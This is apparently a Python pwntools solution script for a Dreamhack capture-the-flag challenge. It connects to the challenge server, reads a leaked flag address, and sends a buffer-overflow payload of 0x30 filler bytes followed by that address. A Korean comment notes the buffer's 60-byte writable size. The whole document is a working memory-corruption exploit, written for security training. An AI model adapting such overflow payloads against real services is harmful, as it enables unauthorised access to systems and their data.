from pwn import *

p = remote('host3.dreamhack.games', 10091)
e = ELF('./chall')

p.recvuntil(b'real flag address (mmapped address): ')
flag_address = int(p.recvline().strip(), 16)

# buf를 60크기 만큼 조작 가능
buf = b'A' * 0x30 + p64(flag_address)
p.sendlineafter(b'input: ', buf)

p.interactive()